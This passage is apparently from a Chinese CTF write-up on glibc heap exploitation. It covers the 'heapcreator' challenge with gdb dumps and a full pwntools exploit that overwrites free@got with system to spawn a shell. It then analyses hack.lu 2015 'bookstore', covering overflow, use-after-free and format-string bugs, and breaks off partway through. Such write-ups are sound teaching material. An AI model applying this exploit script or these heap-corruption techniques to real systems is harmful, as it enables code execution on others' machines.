class="number">0x8a5180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0xf89030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0xf89000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x0000000000f89030</span></span><br><span class="line"><span class="number">0xf89020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0xf89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta">#free 0x40大小</span></span><br><span class="line"><span class="number">0xf89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000f89070</span></span><br><span class="line"><span class="number">0xf89060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> <span class="meta">#free 0x21大小</span></span><br><span class="line"><span class="number">0xf89070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0xf89090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了</li>
</ol>
<h3 id="1-1-4-exp"><a href="#1-1-4-exp" class="headerlink" title="1.1.4. exp"></a>1.1.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'heapcreator'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'heapcreator'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line">heap = elf</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    create(<span class="number">0x18</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create(<span class="number">0x10</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">    <span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line">    <span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line">    <span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line">    <span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line">    <span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">    create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line">    <span class="comment">#create(0x30, p64(0x1234567890))  #1</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># leak freeaddr</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">    free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-2-2015-hacklu-bookstore"><a href="#1-2-2015-hacklu-bookstore" class="headerlink" title="1.2. 2015 hacklu bookstore"></a>1.2. 2015 hacklu bookstore</h2><h3 id="1-2-1-功能分析"><a href="#1-2-1-功能分析" class="headerlink" title="1.2.1. 功能分析"></a>1.2.1. 功能分析</h3><p>先进行功能分析</p>
<ol>
<li>有编辑功能，编辑已存在的1,2堆块，可溢出</li>
<li>删除功能，删除已存在的1,2堆块，uaf</li>
<li>合并功能，将1,2两个堆块合并,格式化字符串</li>
</ol>
<h3 id="1-2-2-漏洞点分析"><a href="#1-2-2-漏洞点分析" class="headerlink" title="1.2.2. 漏洞点分析"></a>1.2.2. 漏洞点分析</h3><ol>
<li>漏洞点1(任意写，\n才结束)</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit_order</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">'\n'</span> )<span class="comment">//关键点</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    idx = cnt++;</span><br><span class="line">    a1[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[cnt - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>漏洞点2(uaf)</li>
</ol>
<p>free后指针没置空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">delete_order</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1); <span class="comment">//重点</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>格式化字符串</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *first_order; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> *second_order; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  first_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  second_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !first_order || !second_order || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">" _____          _   _                 _          _                   _ \n"</span></span><br><span class="line">    <span class="string">"/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"</span></span><br><span class="line">    <span class="string">"  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"</span></span><br><span class="line">    <span class="string">" / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n"</span></span><br><span class="line">    <span class="string">" \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"</span></span><br><span class="line">    <span class="string">"Crappiest and most expensive books for your college education!\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"We can order books for you in case they're not in stock.\n"</span></span><br><span class="line">    <span class="string">"Max. two orders allowed!\n"</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</span><br><span class="line">        edit_order(first_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</span><br><span class="line">        edit_order(second_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        delete_order(first_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        delete_order(second_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, first_order, second_order);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="1-2-3-漏洞利用过程"><a href="#1-2-3-漏洞利用过程" class="headerlink" title="1.2.3. 漏洞利用过程"></a>1.2.3. 漏洞利用过程</h3><p>这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup<br>看了看雪大佬的文章才知道这题怎么利用的</p>
<p>开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的<strong>Your order is submitted!\n</strong>，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到</p>
<ol>
<li>开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x1b8d010-0x010</span><br><span class="line">0x1b8d000:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块1</span></span><br><span class="line">0x1b8d010:	0x0000000074736574	0x0000000000000000</span><br><span class="line">0x1b8d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d090:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块2，溢出修改处</span></span><br><span class="line">0x1b8d0a0:	0x0000000000000000	0x0000000000000000 <span class="comment">#数据部分</span></span><br><span class="line">0x1b8d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d120:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块3</span></span><br><span class="line">0x1b8d130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1b8d140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1b8d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x1b8d1c0:	0x696d627553203a35	0x20726564726f0a74</span><br><span class="line">0x1b8d1d0:	0x216465776f0a0a32	0x6163206e6920750a</span><br><span class="line">0x1b8d1e0:	0x2779656874206573	0x6920746f6e206572</span><br><span class="line">0x1b8d1f0:	0x2e6b636f7473206e	0x5f0a216e6f69740a</span><br><span class="line">0x1b8d200:	0x0a2020202f5c5f5f	0x0000000000000000</span><br><span class="line">0x1b8d210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d310:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1695028-0x28</span><br><span class="line">0x1695000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x1695010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x1695020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x1695030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x1695090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x16950a0:	0x00007f0e99412b00	0x00007f0e99412b78</span><br><span class="line">0x16950b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695120:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x1695130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1695140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1695150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后submit的时候具体会变成什么样呢?，会先复制<strong>Order 1: **，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的</strong>Order 1: **在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次</p>
</li>
<li><p>就是<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: **+chun1+’\n’</p>
</li>
<li><p>如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90</p>
</li>
<li><p>也就是说我们<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: *<em>这个的大小要为0x90，求出chunk大小，0x90-9</em>3-1=0x88-0x1c=0x74</p>
</li>
<li><p>所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了</p>
</li>
</ol>
<p>这是合并后的结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/56gx 0x6e6028-0x28</span><br><span class="line">0x6e6000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x6e6010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x6e6090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x6e60a0:	0x3a3120726564724f	0x2563373136322520</span><br><span class="line">0x6e60b0:	0x3325516e68243331	0x2438322550702431</span><br><span class="line">0x6e60c0:	0x6161616161616170	0x6161616161616161</span><br><span class="line">0x6e60d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6110:	0x6161616161616161	0x724f0a6161616161</span><br><span class="line">0x6e6120:	0x4f203a3220726564	0x203a312072656472</span><br><span class="line">0x6e6130:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6140:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e61a0:	0x64724f0a61616161	0x000a203a32207265</span><br><span class="line">0x6e61b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看</li>
</ol>
